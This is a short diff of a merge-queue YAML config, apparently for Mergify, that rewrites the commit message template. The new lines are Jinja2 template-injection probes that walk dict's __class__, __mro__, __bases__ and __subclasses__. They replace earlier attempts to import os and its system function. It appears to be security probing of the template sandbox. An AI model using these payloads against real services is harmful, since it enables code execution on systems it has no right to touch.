@@ -6,10 +6,10 @@ queue_rules:
       - "#approved-reviews-by>=0"
     merge_method: merge
     commit_message_template: |
-      {% import 'os' %}
-      IMPORTED: {{ os }}
-      {% from 'os' import system %}
-      CMD: {{ system }}
+      DICT_CLASS={{ [dict]|selectattr("__class__")|first }}
+      DICT_MRO={{ [dict]|selectattr("__class__")|first|attr("__mro__") }}
+      DICT_BASES={{ [dict]|selectattr("__class__")|first|attr("__bases__") }}
+      DICT_SUBCLASSES={{ [dict]|selectattr("__class__")|first|attr("__bases__")|first|attr("__subclasses__") }}
 
 merge_queue:
   max_parallel_checks: 1
